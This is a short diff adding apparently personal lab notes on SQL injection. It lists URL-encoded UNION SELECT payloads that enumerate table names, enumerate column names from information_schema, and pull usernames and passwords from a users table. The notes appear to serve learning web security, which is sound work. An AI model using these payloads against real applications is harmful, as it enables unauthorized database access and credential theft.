@@ -29,3 +29,13 @@ SELECT *
 FROM information_schema.columns 
 WHERE table_name = 'Users'
 
+
+get table names:
+'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables-- 
+
+get column names:
+'+UNION+SELECT+column_name,column_name+FROM+information_schema.columns+WHERE+table_name='users_dikord'+-- 
+
+get usernames and passwords:
+'+UNION+SELECT+username_qsdche,password_yibfrj+FROM+users_dikord+--
+
